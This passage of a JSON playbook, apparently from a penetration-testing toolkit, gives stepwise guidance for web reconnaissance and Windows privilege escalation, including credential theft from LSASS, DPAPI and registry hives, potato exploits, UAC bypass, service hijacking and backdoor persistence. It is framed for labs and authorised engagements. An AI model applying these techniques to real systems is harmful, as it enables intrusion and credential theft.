        "Ignoring client-side libraries that carry their own bugs."
      ]
    }
  ],
  "check-cms-version": [
    {
      "when": "A CMS is present (WordPress, Drupal, Joomla).",
      "land": [
        "Probe the version. It decides which CVE checks are worth running."
      ],
      "look": [
        "The CMS version."
      ],
      "win": "The CMS version is known.",
      "mistakes": [
        "Running every CMS exploit blind instead of version-gating."
      ]
    },
    {
      "when": "Enumerate deeper.",
      "land": [
        "The scanner (wpscan and similar) enumerates plugins and themes too."
      ],
      "look": [
        "Vulnerable plugins or themes, often the real way in."
      ],
      "win": "Plugins and versions are enumerated.",
      "mistakes": [
        "Checking core only and missing a vulnerable plugin."
      ]
    }
  ],
  "check-tls-config": [
    {
      "when": "A TLS review for the report.",
      "land": [
        "Review the TLS config: protocols, ciphers, and certificate."
      ],
      "look": [
        "Weak protocols (SSLv3, TLS 1.0), an expired cert, weak ciphers. Report items."
      ],
      "win": "You capture the TLS weaknesses.",
      "mistakes": [
        "Expecting Heartbleed here. That is its own check."
      ]
    }
  ],
  "check-http-methods": [
    {
      "when": "Checking which HTTP methods are allowed.",
      "land": [
        "An OPTIONS or method probe. PUT or DELETE enabled can be a real finding."
      ],
      "look": [
        "PUT (upload a webshell), DELETE, or TRACE."
      ],
      "win": "You list the allowed methods.",
      "mistakes": [
        "Missing a PUT that would let you upload a shell."
      ]
    }
  ],
  "check-cors": [
    {
      "when": "A CORS policy review.",
      "land": [
        "Check the Access-Control-Allow-Origin handling."
      ],
      "look": [
        "A reflected Origin WITH credentials allowed, which is exploitable."
      ],
      "win": "You capture the CORS posture.",
      "mistakes": [
        "Noting a permissive CORS without checking whether credentials are allowed, which is what makes it serious."
      ]
    }
  ],
  "check-web-body": [
    {
      "when": "Reading the page body for leads.",
      "land": [
        "Review the HTML for comments, forms, and mixed content."
      ],
      "look": [
        "Hidden fields, HTML comments with creds or paths, login forms."
      ],
      "win": "You find leads in the page source.",
      "mistakes": [
        "Skipping the source. Comments often leak paths and credentials."
      ]
    },
    {
      "when": "Extract the structure.",
      "land": [
        "The second pass pulls the links and forms."
      ],
      "look": [
        "Endpoints and parameters to test."
      ],
      "win": "A map of the forms and links.",
      "mistakes": [
        "Testing only what the UI shows and missing hidden endpoints."
      ]
    }
  ],
  "check-exposed-files": [
    {
      "when": "Looking for sensitive files left in the web root.",
      "land": [
        "Probe for .git, backups, .env, and config files."
      ],
      "look": [
        "A readable .git (dump it), a .env with secrets, a .bak of the source."
      ],
      "win": "You find an exposed sensitive file.",
      "mistakes": [
        "Not dumping a found .git. git-dumper recovers the whole source."
      ]
    },
    {
      "when": "Check more paths.",
      "land": [
        "The second pass checks further common files."
      ],
      "look": [
        "Config and backup files with credentials."
      ],
      "win": "More exposed files found.",
      "mistakes": [
        "Stopping at the first hit instead of sweeping the common set."
      ]
    },
    {
      "when": "When the target is a Java / Spring Boot application with Actuator endpoints exposed.",
      "land": [
        "Downloads the live JVM /actuator/heapdump and greps strings for cleartext passwords, JWT secrets, and active session tokens."
      ],
      "look": [
        "SPRING_DATASOURCE_PASSWORD, Authorization headers, session cookies, or database URLs in memory."
      ],
      "win": "Cleartext credentials or active session tokens are extracted from the JVM heapdump.",
      "mistakes": [
        "Ignoring /actuator/heapdump because it is binary; strings or VisualVM pulls secrets out of it in seconds."
      ]
    }
  ],
  "check-http-redirect": [
    {
      "when": "Checking for cleartext HTTP.",
      "land": [
        "See whether HTTP redirects to HTTPS."
      ],
      "look": [
        "No redirect means cleartext is served, a low-severity finding."
      ],
      "win": "You confirm the redirect behavior.",
      "mistakes": [
        "Treating it as high severity. It is usually a report note."
      ]
    }
  ],
  "check-subdomain-takeover": [
    {
      "when": "A dangling CNAME to a deprovisioned service.",
      "land": [
        "Check whether a CNAME points at an unclaimed service (S3, Azure, GitHub Pages)."
      ],
      "look": [
        "A CNAME to a service you could register and claim."
      ],
      "win": "You identify a takeover candidate.",
      "mistakes": [
        "Claiming a service outside the engagement scope."
      ]
    }
  ],
  "check-dns-email": [
    {
      "when": "An email DNS review for the report.",
      "land": [
        "Check the SPF and DMARC records."
      ],
      "look": [
        "Missing or weak SPF or DMARC (a spoofing risk). A report item."
      ],
      "win": "You capture the email DNS posture.",
      "mistakes": [
        "Expecting a foothold. This is report material."
      ]
    }
  ],
  "windows-enum": [
    {
      "when": "First thing after a Windows foothold: stage and run the enumeration sweep (winPEAS).",
      "land": [
        "Host the tool on your box, fetch it on the target (the staging steps show serve, fetch, run). Use the cmd form, or iwr inside PowerShell."
      ],
      "look": [
        "The red and yellow highlights: writable services, stored creds, unquoted paths, token privileges."
      ],
      "win": "The sweep prints a list of privesc leads.",
      "mistakes": [
        "Reading past the highlighted lines. They are the leads."
      ]
    },
    {
      "when": "The quick identity and patch-level check.",
      "land": [
        "whoami /all and systeminfo give your privileges, the patch level (for kernel-CVE triage), and your groups."
      ],
      "look": [
        "SeImpersonate, SeBackup and similar in your token, and the OS build for patch gaps."
      ],
      "win": "You know your privileges and the patch level.",
      "mistakes": [
        "Overlooking a dangerous token privilege like SeImpersonate."
      ]
    },
    {
      "when": "Hunt saved credentials and autologon.",
      "land": [
        "Check saved creds and autologon settings. These hand you passwords more often than you expect."
      ],
      "look": [
        "cmdkey entries, DefaultPassword in the registry."
      ],
      "win": "A stored credential or autologon password surfaces.",
      "mistakes": [
        "Skipping this. Stored creds are a frequent easy win."
      ]
    },
    {
      "when": "Immediately after landing on a Windows foothold, to check for credentials left in PowerShell command history.",
      "land": [
        "Reads ConsoleHost_history.txt for the current user (and check other accessible user profiles under AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine)."
      ],
      "look": [
        "ConvertTo-SecureString, New-Object PSCredential, net use, or administrative commands containing passwords."
      ],
      "win": "PowerShell command history reveals a cleartext password or administrative command.",
      "mistakes": [
        "Checking only the active session's in-memory history (Get-History) instead of the persistent PSReadLine file on disk."
      ]
    },
    {
      "when": "From Kali over WinRM when you want a one-shot non-interactive triage before opening Evil-WinRM.",
      "land": [
        "Runs whoami /all, systeminfo, net localgroup administrators, and cmdkey /list remotely via NetExec."
      ],
      "look": [
        "SeImpersonatePrivilege or SeBackupPrivilege in whoami /all, OS build and hotfixes in systeminfo, and saved entries in cmdkey /list."
      ],
      "win": "Token privileges, OS build, local administrators, and saved credentials print in one remote shot.",
      "mistakes": [
        "Running this when port 5985 is closed; switch to On-Host Shell if you entered through a reverse shell or SMB/WMI."
      ]
    }
  ],
  "seimpersonate": [
    {
      "when": "PRECONDITION: your token shows SeImpersonatePrivilege (or SeAssignPrimaryToken).",
      "land": [
        "Confirm the privilege is present and Enabled before anything else."
      ],
      "look": [
        "SeImpersonatePrivilege Enabled in whoami /priv."
      ],
      "win": "The privilege is confirmed present.",
      "mistakes": [
        "Firing a potato without confirming the privilege, which just fails."
      ]
    },
    {
      "when": "MATCH THE BUILD FIRST. This is what prevents the failure.",
      "land": [
        "Pick the potato for the build: Modern Server 2019+ / Win10 1809+ (Build >= 17763) uses GodPotato or PrintSpoofer; Legacy Server 2016 / Win10 < 1809 (Build <= 14393) uses JuicyPotato."
      ],
      "look": [
        "The OS build number (Build >= 17763 vs Build <= 14393)."
      ],
      "win": "You pick the right potato for the OS build.",
      "mistakes": [
        "Using JuicyPotato on Build >= 17763 where custom OXID resolution is blocked."
      ]
    },
    {
      "when": "Modern Windows (Server 2019+ / Win10 1809+ Build >= 17763): run GodPotato or PrintSpoofer.",
      "land": [
        "Serve GodPotato-NET4.exe or PrintSpoofer64.exe from your box, fetch it, and run a harmless SYSTEM proof first."
      ],
      "look": [
        "nt authority\\system from the potato output."
      ],
      "win": "The potato runs your command as SYSTEM.",
      "mistakes": [
        "Wrong potato for the build, or the binary flagged by Defender (see the AMSI move)."
      ]
    },
    {
      "when": "Legacy Windows (Server 2016 / Win10 < 1809 Build <= 14393): run JuicyPotato.",
      "land": [
        "Use JuicyPotato.exe with a listening port (-l) and -t * on pre-1809 builds where the classic DCOM OXID path works."
      ],
      "look": [
        "The proof file as SYSTEM, then your shell."
      ],
      "win": "You confirm SYSTEM and land your payload.",
      "mistakes": [
        "Running JuicyPotato on Windows Server 2019+ (Build >= 17763)."
      ]
    }
  ],
  "potato-select": [
    {
      "when": "When your first potato failed and you need the right one.",
      "land": [
        "GodPotato is the broadest modern choice (2012-2022, Win8-11)."
      ],
      "look": [
        "nt authority\\system from GodPotato."
      ],
      "win": "GodPotato returns SYSTEM.",
      "mistakes": [
        "Not trying GodPotato first on a modern build."
      ]
    },
    {
      "when": "When the spooler or named-pipe path is available.",
      "land": [
        "PrintSpoofer (2016, 2019, Win10). Clean and reliable."
      ],
      "look": [
        "A SYSTEM shell from PrintSpoofer."
      ],
      "win": "PrintSpoofer returns SYSTEM.",
      "mistakes": [
        "Using it where the spooler is disabled."
      ]
    },
    {
      "when": "Only on older builds where the classic COM path still works.",
      "land": [
        "The classic potato for pre-2019. On 2019+ use GodPotato or PrintSpoofer."
      ],
      "look": [
        "A SYSTEM result."
      ],
      "win": "The classic potato returns SYSTEM.",
      "mistakes": [
        "Using it on 2019+ where it no longer works."
      ]
    }
  ],
  "unquoted-service-path": [
    {
      "when": "Looking for an unquoted service path.",
      "land": [
        "List auto-start services whose paths are unquoted and live outside C:\\Windows."
      ],
      "look": [
        "A path like C:\\Program Files\\Some App\\service.exe with no quotes."
      ],
      "win": "An unquoted service path with a writable parent is found.",
      "mistakes": [
        "Chasing an unquoted path in C:\\Windows, which is not writable."
      ]
    },
    {
      "when": "Confirm write access before staging.",
      "land": [
        "Check you actually have write access to the vulnerable folder, then plant your binary at the earlier path (for example C:\\Program.exe)."
      ],
      "look": [
        "Write access confirmed, then SYSTEM after a service restart."
      ],
      "win": "Your planted binary runs as the service account on restart.",
      "mistakes": [
        "Planting before confirming write access."
      ]
    }
  ],
  "weak-service-permissions": [
    {
      "when": "A service your account can reconfigure.",
      "land": [
        "List the services you are allowed to reconfigure."
      ],
      "look": [
        "A service with reconfigure rights for your user."
      ],
      "win": "A reconfigurable service is found.",
      "mistakes": [
        "Overlooking a service because you can reconfigure but not start it (it still runs on reboot)."
      ]
    },
    {
      "when": "Point the service at your command.",
      "land": [
        "Aim the service at a conclusive command, then sc stop and start it (or wait for a reboot)."
      ],
      "look": [
        "nt authority\\system after the restart."
      ],
      "win": "The service runs your payload as SYSTEM.",
      "mistakes": [
        "Not restarting the service, so the change never fires."
      ]
    },
    {
      "when": "When the executable itself is writable.",
      "land": [
        "Keep a backup, then overwrite the binary with your payload."
      ],
      "look": [
        "SYSTEM when the service next runs."
      ],
      "win": "The replaced binary runs as the service account.",
      "mistakes": [
        "Not backing up the original binary."
      ]
    },
    {
      "when": "Once icacls confirms F, M, or W rights on the service executable itself.",
      "land": [
        "Copy the original .exe to .bak, overwrite the service binary with your staged payload, then restart the service with net stop and net start."
      ],
      "look": [
        "1 file(s) copied and the service restarting (or a SYSTEM callback/local-admin grant firing on restart or reboot)."
      ],
      "win": "Service Control Manager launches your replacement binary as NT AUTHORITY\\SYSTEM.",
      "mistakes": [
        "Trying to overwrite the binary while the running process holds an exclusive file lock (stop the service first or rename the in-use binary if folder permissions allow)."
      ]
    }
  ],
  "alwaysinstallelevated": [
    {
      "when": "Checking for AlwaysInstallElevated.",
      "land": [
        "Both the HKLM and HKCU keys have to read 1. Either one alone gets you nowhere."
      ],
      "look": [
        "Both keys set to 1."
      ],
      "win": "Both AlwaysInstallElevated keys are 1.",
      "mistakes": [
        "Celebrating one key. You need both."
      ]
    },
    {
      "when": "Exploit with a malicious MSI.",
      "land": [
        "Build the MSI on your box, upload it, run msiexec. It installs as SYSTEM. Put a reverse shell in the MSI (the Workbench builds the payload)."
      ],
      "look": [
        "A SYSTEM shell when the MSI runs."
      ],
      "win": "The MSI installs your payload as SYSTEM.",
      "mistakes": [
        "Wrong architecture MSI for the target."
      ]
    },
    {
      "when": "After transferring your msfvenom MSI payload onto the Windows target.",
      "land": [
        "Runs msiexec silently (/quiet /qn); Windows Installer executes the package as NT AUTHORITY\\SYSTEM."
      ],
      "look": [
        "An incoming SYSTEM shell on your listener (or the local admin group addition taking effect)."
      ],
      "win": "msiexec runs the MSI as SYSTEM and delivers your elevated shell.",
      "mistakes": [
        "Omitting /quiet /qn, which can hang waiting for a GUI prompt in a non-interactive session."
      ]
    }
  ],
  "dpapi-secrets": [
    {
      "when": "Hunting DPAPI-protected credentials (RDP, VPN, scheduled-task creds).",
      "land": [
        "Locate the credential blobs and their masterkey GUIDs. Every blob records which masterkey it needs."
      ],
      "look": [
        "Credential blobs under AppData and their masterkey GUIDs."
      ],
      "win": "You have the blobs and their masterkey GUIDs.",
      "mistakes": [
        "Trying to decrypt a blob without its masterkey."
      ]
    },
    {
      "when": "Unwrap the masterkey.",
      "land": [
        "Unwrap the masterkey with the user password (or the domain backup key)."
      ],
      "look": [
        "The decrypted masterkey."
      ],
      "win": "The masterkey is unwrapped.",
      "mistakes": [
        "Wrong password for the masterkey owner."
      ]
    },
    {
      "when": "Decrypt the blob.",
      "land": [
        "Decrypt the blob with the unwrapped key. Out come RDP, VPN and service passwords."
      ],
      "look": [
        "Cleartext credentials."
      ],
      "win": "The blob decrypts to a usable credential.",
      "mistakes": [
        "Pairing the wrong masterkey with the blob."
      ]
    },
    {
      "when": "The on-box option.",
      "land": [
        "When executing as that user or SYSTEM, mimikatz dpapi does it on the box."
      ],
      "look": [
        "Cleartext credentials from mimikatz."
      ],
      "win": "mimikatz decrypts the blobs on-box.",
      "mistakes": [
        "Running in the wrong user context."
      ]
    }
  ],
  "stored-credentials": [
    {
      "when": "The saved-credential sweep.",
      "land": [
        "cmdkey /list shows saved creds. If one is present, runas /savecred uses it without knowing the password."
      ],
      "look": [
        "A saved credential for a privileged user."
      ],
      "win": "runas /savecred runs as the saved user.",
      "mistakes": [
        "Not trying runas /savecred with a listed credential."
      ]
    },
    {
      "when": "Autologon secrets.",
      "land": [
        "Check DefaultUserName and DefaultPassword in the registry (cleartext)."
      ],
      "look": [
        "A cleartext autologon password."
      ],
      "win": "An autologon password surfaces.",
      "mistakes": [
        "Overlooking the autologon registry keys."
      ]
    },
    {
      "when": "Imaging answer files.",
      "land": [
        "Check C:\\Windows\\Panther\\Unattend.xml and similar. They carry local admin passwords in cleartext, sometimes base64 (the Workbench encoder decodes it)."
      ],
      "look": [
        "A password in an unattend or sysprep file."
      ],
      "win": "An answer file yields a local admin password.",
      "mistakes": [
        "Missing the base64-encoded password variant."
      ]
    },
    {
      "when": "mRemoteNG and .rdp configs.",
      "land": [
        "mRemoteNG stores passwords recoverable via a static key. .rdp files may hold creds."
      ],
      "look": [
        "Stored connection passwords."
      ],
      "win": "A stored remote-connection password is recovered.",
      "mistakes": [
        "Ignoring saved-session files."
      ]
    },
    {
      "when": "Browser vaults.",
      "land": [
        "DPAPI-protected. Recover with SharpChrome, or copy Login Data plus the key and decrypt offline."
      ],
      "look": [
        "Saved browser passwords."
      ],
      "win": "Browser-stored creds are recovered.",
      "mistakes": [
        "Copying Login Data without the key."
      ]
    },
    {
      "when": "PuTTY saved sessions.",
      "land": [
        "PuTTY stores secrets in cleartext: a ProxyPassword and ProxyUsername pair, or a saved key."
      ],
      "look": [
        "A cleartext proxy password or a key path."
      ],
      "win": "A PuTTY secret surfaces.",
      "mistakes": [
        "Overlooking the PuTTY registry sessions."
      ]
    },
    {
      "when": "WinSCP sessions.",
      "land": [
        "WinSCP stores passwords obfuscated, not cleartext. Flag them, then recover with a WinSCP decoder."
      ],
      "look": [
        "Obfuscated WinSCP session passwords."
      ],
      "win": "A WinSCP password decodes.",
      "mistakes": [
        "Treating the obfuscated blob as cleartext."
      ]
    },
    {
      "when": "From Kali over WinRM when you want to check Credential Manager, Winlogon autologon keys, and unattend XML files in one remote command.",
      "land": [
        "Runs cmdkey /list, queries the Winlogon registry key, and searches C:\\ for unattend/sysprep XML files via NetExec."
      ],
      "look": [
        "Target: lines in cmdkey /list, DefaultPassword in Winlogon, or paths to Unattend.xml / sysprep.xml."
      ],
      "win": "Saved credentials, autologon secrets, or answer file paths print remotely.",
      "mistakes": [
        "Forgetting to switch to runas /savecred on-host if cmdkey /list shows a saved Administrator entry."
      ]
    }
  ],
  "windows-old-hives": [
    {
      "when": "A leftover windows.old tree.",
      "land": [
        "Look for windows.old. The old SAM, SYSTEM and SECURITY live under its System32\\config."
      ],
      "look": [
        "Readable SAM, SYSTEM and SECURITY in windows.old."
      ],
      "win": "The old hives are readable.",
      "mistakes": [
        "Overlooking windows.old after an in-place upgrade."
      ]
    },
    {
      "when": "Save the LIVE hives (local admin or SYSTEM).",
      "land": [
        "reg save the SAM, SYSTEM and SECURITY, then exfil the three files."
      ],
      "look": [
        "Three saved hive files."
      ],
      "win": "You have the live hives off the box.",
      "mistakes": [
        "Saving only SAM. You need SYSTEM too for the bootkey."
      ]
    },
    {
      "when": "Parse offline.",
      "land": [
        "secretsdump on Kali. Crack or pass-the-hash the recovered Administrator hash. Identify the hashes in the Workbench Hash ID."
      ],
      "look": [
        "Local account NT hashes."
      ],
      "win": "You recover the Administrator hash.",
      "mistakes": [
        "Cracking when pass-the-hash would do."
      ]
    },
    {
      "when": "Dump remotely with admin creds.",
      "land": [
        "secretsdump remotely when you already hold admin on the box."
      ],
      "look": [
        "The SAM and LSA secrets."
      ],
      "win": "Remote secretsdump returns the hashes.",
      "mistakes": [
        "Running it without the admin rights it needs."
      ]
    },
    {
      "when": "HiveNightmare or SeriousSAM (CVE-2021-36934) shadow copy extraction.",
      "land": [
        "Check permissions on SAM with icacls and copy SAM and SYSTEM from HarddiskVolumeShadowCopy1 to %TEMP%."
      ],
      "look": [
        "Successful copy of SAM.bak and SYSTEM.bak as an unprivileged user."
      ],
      "win": "You obtain SAM and SYSTEM backup hives without administrator rights.",
      "mistakes": [
        "Missing shadow copies on the target, or running on a patched Windows build where BUILTIN\\Users lacks read permissions."
      ]
    }
  ],
  "wesng-patch-gaps": [
    {
      "when": "Capture systeminfo for an offline patch diff.",
      "land": [
        "Run systeminfo on the target and capture the full output on your side."
      ],
      "look": [
        "The OS build and installed hotfixes."
      ],
      "win": "You have systeminfo saved.",
      "mistakes": [
        "Truncating the output."
      ]
    },
    {
      "when": "Run wesng on your box.",
      "land": [
        "wesng on Kali produces the missing-patch list from the systeminfo."
      ],
      "look": [
        "CVEs with public local exploits, newest first."
      ],
      "win": "wesng lists exploitable patch gaps.",
      "mistakes": [
        "Not refreshing the wesng database."
      ]
    },
    {
      "when": "The classic alternative.",
      "land": [
        "windows-exploit-suggester (older, well proven on 2008-era hosts)."
      ],
      "look": [
        "Suggested exploits for old hosts."
      ],
      "win": "A suggestion list for a legacy host.",
      "mistakes": [
        "Using it on modern builds where wesng is better."
      ]
    }
  ],
  "windows-persistence": [
    {
      "when": "Post-admin, a textbook local-admin backdoor. Labs only, far too noisy in real work.",
      "land": [
        "Add a local admin user. It stands out in any user audit."
      ],
      "look": [
        "The new admin account."
      ],
      "win": "A backdoor admin account exists.",
      "mistakes": [
        "Using it in a real engagement where it is far too loud."
      ]
    },
    {
      "when": "A SYSTEM scheduled task.",
      "land": [
        "A scheduled task runs your binary as SYSTEM daily."
      ],
      "look": [
        "The task registered."
      ],
      "win": "The task runs your payload as SYSTEM.",
      "mistakes": [
        "Leaving it behind after the lab."
      ]
    },
    {
      "when": "A Run key.",
      "land": [
        "A Run key triggers your payload at the next logon."
      ],
      "look": [
        "The Run key set."
      ],
      "win": "The payload runs at logon.",
      "mistakes": [
        "Forgetting it is per-user unless placed in HKLM."
      ]
    }
  ],
  "lsass-dump-onbox": [
    {
      "when": "Dumping LSASS on-box (you are admin or SYSTEM).",
      "land": [
        "Grab the LSASS PID first (tasklist /svc). comsvcs MiniDump needs it."
      ],
      "look": [
        "The lsass.exe PID."
      ],
      "win": "You have the LSASS PID.",
      "mistakes": [
        "Using the wrong PID."
      ]
    },
    {
      "when": "Built-in comsvcs dump.",
      "land": [
        "comsvcs MiniDump with the real PID, from an elevated prompt. Nothing to upload."
      ],
      "look": [
        "A lsass.dmp written."
      ],
      "win": "LSASS is dumped with a LOLBin.",
      "mistakes": [
        "Defender blocking it (see defense-enum and the AMSI move)."
      ]
    },
    {
      "when": "When comsvcs is blocked.",
      "land": [
        "procdump (Sysinternals). Serve it from your box, fetch it, dump LSASS."
      ],
      "look": [
        "A dump file."
      ],
      "win": "procdump captures LSASS.",
      "mistakes": [
        "procdump itself flagged. Rename or use the comsvcs route."
      ]
    },
    {
      "when": "Exfil the dump.",
      "land": [
        "Catch it on your box over an SMB share and move the dmp off the target."
      ],
      "look": [
        "The dmp on your Kali."
      ],
      "win": "The dump is off the box.",
      "mistakes": [
        "Parsing on the target, which is noisy and leaves artifacts."
      ]
    },
    {
      "when": "Parse offline.",
      "land": [
        "pypykatz on your box. Out come logonpasswords, NT hashes and Kerberos tickets. Identify the hashes in the Workbench Hash ID."
      ],
      "look": [
        "Cleartext passwords and NT hashes for logged-on users."
      ],
      "win": "The dump yields credentials.",
      "mistakes": [
        "Ignoring the Kerberos tickets, which enable pass-the-ticket."
      ]
    }
  ],
  "defense-enum": [
    {
      "when": "Situational awareness: the PowerShell language mode.",
      "land": [
        "Check FullLanguage vs ConstrainedLanguage. Constrained is a lockdown signal."
      ],
      "look": [
        "ConstrainedLanguage, which restricts your PowerShell."
      ],
      "win": "You know the language mode.",
      "mistakes": [
        "Ignoring CLM, then wondering why scripts fail."
      ]
    },
    {
      "when": "Defender status.",
      "land": [
        "Check whether Defender and real-time protection are running."
      ],
      "look": [
        "Real-time protection on or off."
      ],
      "win": "You know the Defender posture.",
      "mistakes": [
        "Dropping a known tool before checking."
      ]
    },
    {
      "when": "Exclusion folders.",
      "land": [
        "List folders Defender is set to skip. Situational awareness, recorded not acted on."
      ],
      "look": [
        "Excluded paths, which are safe to drop tools into."
      ],
      "win": "You know the exclusions.",
      "mistakes": [
        "Acting outside what the engagement authorizes."
      ]
    },
    {
      "when": "AppLocker policy.",
      "land": [
        "Read the effective AppLocker policy and which rule collections are enforced."
      ],
      "look": [
        "Enforced rule collections."
      ],
      "win": "You know the AppLocker constraints.",
      "mistakes": [
        "Fighting AppLocker blind instead of reading the policy."
      ]
    },
    {
      "when": "From Kali over WinRM before dropping binaries or scripts onto the target.",
      "land": [
        "Checks PowerShell LanguageMode, Defender real-time protection status, and exclusion paths in one remote command."
      ],
      "look": [
        "FullLanguage vs ConstrainedLanguage, RealTimeProtectionEnabled True/False, and any ExcludedPath folders."
      ],
      "win": "Language mode, Defender status, and exclusion folders print remotely before you touch disk.",
      "mistakes": [
        "Uploading winPEAS or Rubeus to C:\\Windows\\Temp before checking if a Defender exclusion folder exists."
      ]
    }
  ],
  "windows-dll-hijack": [
    {
      "when": "A third-party service running as LocalSystem.",
      "land": [
        "Confirm the service runs as LocalSystem."
      ],
      "look": [
        "A SYSTEM-level third-party service."
      ],
      "win": "A SYSTEM service is identified.",
      "mistakes": [
        "Targeting a built-in service with no hijackable DLL."
      ]
    },
    {
      "when": "Find a hijackable DLL.",
      "land": [
        "Find a DLL it loads from a writable directory, or one it cannot find at all (phantom)."
      ],
      "look": [
        "A missing or writable-path DLL (Procmon shows NAME NOT FOUND)."
      ],
      "win": "A hijack slot is found.",
      "mistakes": [
        "Targeting a DLL in a protected path."
      ]
    },
    {
      "when": "Build the DLL.",
      "land": [
        "Build a DLL whose DllMain runs your payload on attach."
      ],
      "look": [
        "A compiled DLL."
      ],
      "win": "Your DLL is ready.",
      "mistakes": [
        "A slow DllMain that hangs the host process."
      ]
    },
    {
      "when": "Plant and restart.",
      "land": [
        "Plant it with the expected name, restart the service to run as SYSTEM."
      ],
      "look": [
        "nt authority\\system."
      ],
      "win": "The hijacked DLL runs as SYSTEM.",
      "mistakes": [
        "No way to restart the service, so it never loads."
      ]
    }
  ],
  "windows-schtask-abuse": [
    {
      "when": "A SYSTEM task with a writable target.",
      "land": [
        "Find a task whose Run As User is SYSTEM and whose target path you can write."
      ],
      "look": [
        "A SYSTEM task pointing at a writable script or binary."
      ],
      "win": "A writable SYSTEM task is found.",
      "mistakes": [
        "Assuming the task runs as SYSTEM without checking."
      ]
    },
    {
      "when": "Confirm write.",
      "land": [
        "Confirm Modify or Full control on the script or binary."
      ],
      "look": [
        "Write permission on the target."
      ],
      "win": "Write access confirmed.",
      "mistakes": [
        "Assuming write without checking the ACL."
      ]
    },
    {
      "when": "Swap the payload.",
      "land": [
        "Back up the original, overwrite with your payload."
      ],
      "look": [
        "Your payload in place."
      ],
      "win": "The task now runs your payload.",
      "mistakes": [
        "Not backing up the original."
      ]
    },
    {
      "when": "Trigger.",
      "land": [
        "Run the task now, or wait for its schedule. It runs as SYSTEM."
      ],
      "look": [
        "nt authority\\system."
      ],
      "win": "The task executes as SYSTEM.",
      "mistakes": [
        "Waiting on a schedule when you could run it now."
      ]
    }
  ],
  "windows-patch-exploit": [
    {
      "when": "Capture build and hotfixes for a diff.",
      "land": [
        "Capture the exact build and installed hotfixes offline."
      ],
      "look": [
        "The build and KB list."
      ],
      "win": "You have the patch state.",
      "mistakes": [
        "Working from a guess instead of the real hotfix list."
      ]
    },
    {
      "when": "Name the missing patches.",
      "land": [
        "Name the missing patches with a public local exploit, newest and most reliable first."
      ],
      "look": [
        "A ranked exploit list."
      ],
      "win": "A candidate kernel LPE is named.",
      "mistakes": [
        "Picking the flashiest over the most reliable."
      ]
    },
    {
      "when": "Get a PoC.",
      "land": [
        "Find a known-good PoC for the KB or CVE. Prefer a precompiled binary."
      ],
      "look": [
        "A trustworthy PoC."
      ],
      "win": "You have a PoC ready.",
      "mistakes": [
        "Running a random unreviewed binary."
      ]
    },
    {
      "when": "Run it.",
      "land": [
        "Read the exploit first, then run it and confirm SYSTEM."
      ],
      "look": [
        "nt authority\\system."
      ],
      "win": "The kernel LPE returns SYSTEM.",
      "mistakes": [
        "Running a kernel exploit without reading it. It can BSOD the box."
      ]
    }
  ],
  "uac-bypass": [
    {
      "when": "Medium integrity with admin membership (a filtered token).",
      "land": [
        "Confirm Medium Mandatory Level plus admin group. A bypass can un-filter the token."
      ],
      "look": [
        "Medium integrity and admin in your groups."
      ],
      "win": "A bypass is applicable.",
      "mistakes": [
        "Trying a bypass as a non-admin. There is nothing to un-filter."
      ]
    },
    {
      "when": "Stage the fodhelper payload.",
      "land": [
        "Stage your command in the key fodhelper reads. The empty DelegateExecute forces the command handler."
      ],
      "look": [
        "The registry staged."
      ],
      "win": "The payload is staged.",
      "mistakes": [
        "Wrong key path."
      ]
    },
    {
      "when": "Trigger the auto-elevating binary.",
      "land": [
        "fodhelper runs your staged command at high integrity with no prompt (computerdefaults also works)."
      ],
      "look": [
        "High integrity."
      ],
      "win": "You run at high integrity.",
      "mistakes": [
        "Expecting it where UAC is set to always-notify with no auto-elevation."
      ]
    },
    {
      "when": "Confirm and clean up.",
      "land": [
        "High Mandatory Level confirms full admin. Clean up the registry key afterward."
      ],
      "look": [
        "High integrity confirmed."
      ],
      "win": "Full admin confirmed.",
      "mistakes": [
        "Leaving the registry key behind."
      ]
    }
  ],
  "com-hijack": [
    {
      "when": "A privileged process resolving a missing HKCU CLSID.",
      "land": [
        "Find a CLSID a privileged process reads from HKCU that does not exist. That is a hijack slot."
      ],
      "look": [
        "A missing HKCU CLSID (Procmon NAME NOT FOUND)."
      ],
      "win": "A hijack slot is found.",
      "mistakes": [
        "Targeting a CLSID resolved from HKLM, which you cannot write."
      ]
    },
    {
      "when": "Build the COM DLL.",
      "land": [
        "Build a DLL whose COM entry point runs your payload. Keep it fast so it does not hang the host."
      ],
      "look": [
        "A compiled COM DLL."
      ],
      "win": "Your DLL is ready.",
      "mistakes": [
        "A slow entry point that hangs the process."
      ]
    },
    {
      "when": "Redirect the CLSID.",
      "land": [
        "Point the CLSID at your DLL. Set ThreadingModel to Apartment for compatibility."
      ],
      "look": [
        "The CLSID redirected."
      ],
      "win": "The CLSID points at your DLL.",
      "mistakes": [
        "Omitting ThreadingModel, which can break loading."
      ]
    },
    {
      "when": "Trigger.",
      "land": [
        "The next privileged instantiation runs your DLL. The key also persists."
      ],
      "look": [
        "Membership or identity confirms it ran."
      ],
      "win": "The hijack runs your payload.",
      "mistakes": [
        "No trigger to make the privileged process instantiate the CLSID."
      ]
    }
  ],
  "windows-service-dacl-abuse": [
    {
      "when": "A service you can reconfigure (SERVICE_CHANGE_CONFIG).",
      "land": [
        "Look for SERVICE_CHANGE_CONFIG (RCCE or WPWO in the SDDL), even without START or STOP."
      ],
      "look": [
        "A service with change-config rights."
      ],
      "win": "A reconfigurable service is found.",
      "mistakes": [
        "Dismissing it because you lack start rights (reboot still fires it)."
      ]
    },
    {
      "when": "Record the originals.",
      "land": [
        "Note the current BINARY_PATH_NAME and SERVICE_START_NAME so you can restore them."
      ],
      "look": [
        "The current config."
      ],
      "win": "You have a restore point.",
      "mistakes": [
        "Not recording the originals."
      ]
    },
    {
      "when": "Reconfigure.",
      "land": [
        "Reconfigure the binpath. If you only hold config and not start, change obj= to LocalSystem so it runs as SYSTEM on the next start."
      ],
      "look": [
        "The binpath updated."
      ],
      "win": "The service points at your payload as SYSTEM.",
      "mistakes": [
        "Forgetting to also set obj= when you lack start rights."
      ]
    },
    {
      "when": "Trigger.",
      "land": [
        "Start it if allowed, otherwise wait for auto-start or a reboot, then confirm."
      ],
      "look": [
        "nt authority\\system."
      ],
      "win": "The service runs your payload as SYSTEM.",
      "mistakes": [
        "Forgetting to restore the original config afterward."
      ]
    },
    {
      "when": "When you hold SERVICE_CHANGE_CONFIG plus SERVICE_STOP/START (such as Server Operators membership) and want a one-liner.",
      "land": [
        "Updates the service binPath to your reverse shell or command and immediately cycles the service to trigger execution as SYSTEM."
      ],
      "look": [
